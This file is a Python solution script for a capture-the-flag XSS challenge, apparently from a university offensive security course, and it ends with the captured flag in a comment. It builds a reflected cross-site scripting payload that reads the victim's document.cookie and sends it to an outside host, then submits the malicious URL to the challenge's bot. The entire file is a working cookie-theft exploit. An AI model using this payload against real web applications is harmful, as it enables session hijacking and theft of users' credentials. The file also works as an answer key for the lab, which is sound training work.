import requests
import urllib.parse

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1509'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

ip = 'http://137.184.25.70:8000'
script = f"<script>var xhr=new XMLHttpRequest();xhr.open('GET','{ip}/'+document.cookie,false);xhr.send();</script>"
data = {
    'url': f'http://offsec-chalbroker.osiris.cyber.nyu.edu:10003/greet?name={urllib.parse.quote(script)}'
}

print(f"[*] Submitting XSS payload...")
response = requests.post(url=f'{url}/submit', data=data, cookies=cookies)
print(f"[+] Response: {response.text}")
print(f"[*] See flag at Cloud VM: {ip}")

# flag{S33_XSS_1snt_s0_h4rd_1s_1t?_fa0ee3afc2d07c2c}
